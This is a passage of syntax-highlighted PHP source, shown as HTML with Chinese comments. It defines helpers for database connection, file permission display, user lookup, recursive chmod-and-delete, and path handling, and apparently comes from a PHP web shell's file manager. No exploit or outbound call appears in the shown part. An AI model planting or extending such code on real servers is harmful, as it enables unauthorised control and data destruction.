#ffcc66;\">dbname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!@<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_select_db(<\/span>$<span style=\"color: #ffcc66;\">dbname<\/span>, $<span style=\"color: #ffcc66;\">link<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Database selected has error&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">link<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_get_server_info(<\/span>) &gt; <span style=\"color: #66cccc;\">'4.1'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">charset<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">in_array(strtolower(<\/span>$<span style=\"color: #ffcc66;\">charset<\/span>), $<span style=\"color: #ffcc66;\">charsetdb<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SET character_set_connection=$charset, character_set_results=$cha<\/span><span style=\"color: #66cccc; text-decoration: underline;\">rset, character_set_client=binary;\"<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">link<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">link<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">s_array<\/span>(&amp;$<span style=\"color: #ffcc66;\">array<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_array(<\/span>$<span style=\"color: #ffcc66;\">array<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">array<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">k<\/span> =&gt; $<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">array<\/span>[$<span style=\"color: #ffcc66;\">k<\/span>] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">s_array(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_string(<\/span>$<span style=\"color: #ffcc66;\">array<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">array<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">stripslashes(<\/span>$<span style=\"color: #ffcc66;\">array<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">array<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#28165;&#38500;HTML&#20195;&#30721;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">html_clean<\/span>($<span style=\"color: #ffcc66;\">content<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">content<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">htmlspecialchars(<\/span>$<span style=\"color: #ffcc66;\">content<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">content<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">\"\\n\"<\/span>, <span style=\"color: #66cccc;\">\"&lt;br \/&gt;\"<\/span>, $<span style=\"color: #ffcc66;\">content<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">content<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">\"  \"<\/span>, <span style=\"color: #66cccc;\">\"&amp;nbsp;&amp;nbsp;\"<\/span>, $<span style=\"color: #ffcc66;\">content<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">content<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">\"\\t\"<\/span>, <span style=\"color: #66cccc;\">\"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;\"<\/span>, $<span style=\"color: #ffcc66;\">content<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">content<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;&#26435;&#38480;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getChmod<\/span>($<span style=\"color: #ffcc66;\">filepath<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">substr(base_convert(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fileperms(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>),<span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">8<\/span>),-<span style=\"color: #cccccc; background-color: #2d2d2d;\">4<\/span>);\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getPerms<\/span>($<span style=\"color: #ffcc66;\">filepath<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mode<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fileperms(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>xC000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>xC000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'s'<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x4000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x4000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'d'<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>xA000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>xA000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'l'<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x8000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x8000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'-'<\/span>;}<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x6000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x6000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'b'<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x2000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x2000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'c'<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> (($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x1000) === <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x1000) {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'p'<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">else<\/span> {$<span style=\"color: #ffcc66;\">type<\/span> = <span style=\"color: #66cccc;\">'?'<\/span>;}\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'read'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00400<\/span>) ? <span style=\"color: #66cccc;\">'r'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'write'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00200<\/span>) ? <span style=\"color: #66cccc;\">'w'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00100<\/span>) ? <span style=\"color: #66cccc;\">'x'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">group<\/span>[<span style=\"color: #66cccc;\">'read'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00040<\/span>) ? <span style=\"color: #66cccc;\">'r'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">group<\/span>[<span style=\"color: #66cccc;\">'write'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00020<\/span>) ? <span style=\"color: #66cccc;\">'w'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">group<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00010<\/span>) ? <span style=\"color: #66cccc;\">'x'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">world<\/span>[<span style=\"color: #66cccc;\">'read'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00004<\/span>) ? <span style=\"color: #66cccc;\">'r'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">world<\/span>[<span style=\"color: #66cccc;\">'write'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00002<\/span>) ? <span style=\"color: #66cccc;\">'w'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">world<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>] = ($<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">00001<\/span>) ? <span style=\"color: #66cccc;\">'x'<\/span> : <span style=\"color: #66cccc;\">'-'<\/span>;<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>( $<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x800 ) {$<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>] = ($<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>]==<span style=\"color: #66cccc;\">'x'<\/span>) ? <span style=\"color: #66cccc;\">'s'<\/span> : <span style=\"color: #66cccc;\">'S<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">;}<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>( $<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x400 ) {$<span style=\"color: #ffcc66;\">group<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>] = ($<span style=\"color: #ffcc66;\">group<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>]==<span style=\"color: #66cccc;\">'x'<\/span>) ? <span style=\"color: #66cccc;\">'s'<\/span> : <span style=\"color: #66cccc;\">'S<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">;}<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>( $<span style=\"color: #ffcc66;\">mode<\/span> &amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>x200 ) {$<span style=\"color: #ffcc66;\">world<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>] = ($<span style=\"color: #ffcc66;\">world<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>]==<span style=\"color: #66cccc;\">'x'<\/span>) ? <span style=\"color: #66cccc;\">'t'<\/span> : <span style=\"color: #66cccc;\">'T<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">;}<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">type<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'read'<\/span>].$<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'write'<\/span>].$<span style=\"color: #ffcc66;\">owner<\/span>[<span style=\"color: #66cccc;\">'execute'<\/span>].$<span style=\"color: #ffcc66;\">group<\/span>[<span style=\"color: #66cccc;\">'read'<\/span>]<span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">group<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'write'<\/span><span style=\"text-decoration: underline;\">].$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">group<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'execute'<\/span><span style=\"text-decoration: underline;\">].$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">world<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'read'<\/span><span style=\"text-decoration: underline;\">].$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">world<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'write'<\/span><span style=\"text-decoration: underline;\">].$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">world<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'execute'<\/span><span style=\"text-decoration: underline;\">];<\/span>\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getUser<\/span>($<span style=\"color: #ffcc66;\">filepath<\/span>)     {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'posix_getpwuid'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">array<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">posix_getpwuid(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fileowner(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">array<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_array(<\/span>$<span style=\"color: #ffcc66;\">array<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #66cccc;\">' \/ &lt;a href=\"#\" title=\"User: '<\/span>.$<span style=\"color: #ffcc66;\">array<\/span>[<span style=\"color: #66cccc;\">'name'<\/span>].<span style=\"color: #66cccc;\">'&amp;#13&amp;#10Passwd<\/span><span style=\"color: #66cccc; text-decoration: underline;\">: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'passwd'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;#13&amp;#10Uid: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'uid'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;#13&amp;#10gid: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'gid'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;#13&amp;#10Gecos: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'gecos'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;#13&amp;#10Dir: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dir'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;#13&amp;#10Shell: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'shell'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">array<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'name'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #66cccc;\">''<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#21024;&#38500;&#30446;&#24405;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">deltree<\/span>($<span style=\"color: #ffcc66;\">deldir<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mydir<\/span>=<span style=\"color: #99cc99;\">@dir<\/span>($<span style=\"color: #ffcc66;\">deldir<\/span>);<span style=\"color: #f2777a; background-color: #515151;\">   <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">file<\/span>=$<span style=\"color: #ffcc66;\">mydir<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">read<\/span>())     {<span style=\"color: #f2777a; background-color: #515151;\">       <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>((<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>)) &amp;&amp; ($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'.'<\/span>) &amp;&amp; ($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'..'<\/span>)) {<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">chmod(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0777<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">deltree(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>);<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_file(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">chmod(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0777<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">unlink(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mydir<\/span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close<\/span>();<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">chmod(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0777<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> @<span style=\"color: #cccccc; background-color: #2d2d2d;\">rmdir(<\/span>$<span style=\"color: #ffcc66;\">deldir<\/span>) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">bg<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">bgc<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> ($<span style=\"color: #ffcc66;\">bgc<\/span>++%<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>==<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>) ? <span style=\"color: #66cccc;\">'alt1'<\/span> : <span style=\"color: #66cccc;\">'alt2'<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getPath<\/span>($<span style=\"color: #ffcc66;\">scriptpath<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">nowpath<\/span> == <span style=\"color: #66cccc;\">'.'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">nowpath<\/span> = $<span style=\"color: #ffcc66;\">scriptpath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">nowpath<\/span> = <span style=\"color: #cccccc; 